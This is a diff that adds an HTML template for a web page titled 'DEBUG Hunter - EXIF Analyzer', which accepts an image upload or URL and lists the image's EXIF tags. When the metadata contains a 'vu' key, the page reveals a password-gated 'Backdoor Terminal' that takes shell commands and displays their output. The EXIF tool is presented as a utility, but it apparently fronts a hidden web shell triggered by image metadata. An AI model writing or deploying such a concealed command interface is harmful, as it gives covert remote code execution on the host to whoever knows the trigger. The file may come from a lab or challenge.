@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DEBUG Hunter EXIF Tool</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+        }
+        input, textarea, select, button {
+            background-color: #161b22;
+            color: #c9d1d9;
+            border: 1px solid #30363d;
+            padding: 8px;
+            margin: 5px 0;
+            width: 100%;
+        }
+        .exif-box {
+            background-color: #161b22;
+            padding: 10px;
+            border: 1px solid #30363d;
+            margin-top: 15px;
+        }
+        h1, h2 {
+            color: #58a6ff;
+        }
+        .terminal-output {
+            white-space: pre-wrap;
+            background: #0d1117;
+            border-left: 4px solid #58a6ff;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>DEBUG Hunter - EXIF Analyzer</h1>
+    <form method="POST" enctype="multipart/form-data">
+        <label>Upload Image:</label>
+        <input type="file" name="image">
+        <label>OR Image URL:</label>
+        <input type="text" name="image_url" placeholder="https://example.com/image.jpg">
+        <br>
+        <button type="submit">Analyze EXIF</button>
+    </form>
+
+    {% if exif %}
+    <div class="exif-box">
+        <h2>EXIF Data:</h2>
+        <ul>
+        {% for key, value in exif.items() %}
+            <li><strong>{{ key }}:</strong> {{ value }}</li>
+        {% endfor %}
+        </ul>
+        <form method="POST" action="/save">
+            <input type="hidden" name="image_path" value="{{ image_path }}">
+            <button type="submit">Save Modified Image</button>
+        </form>
+    </div>
+    {% endif %}
+
+    {% if exif.get("vu") %}
+    <h2>Backdoor Terminal</h2>
+    <form method="POST">
+        <input type="hidden" name="image_path" value="{{ image_path }}">
+        <input type="password" name="password" placeholder="Enter password">
+        <textarea name="command" placeholder="ls -la"></textarea>
+        <button type="submit" name="run_command">Execute Command</button>
+    </form>
+    {% endif %}
+
+    {% if output %}
+    <h3>Command Output:</h3>
+    <div class="terminal-output">{{ output }}</div>
+    {% endif %}
+</body>
+</html>
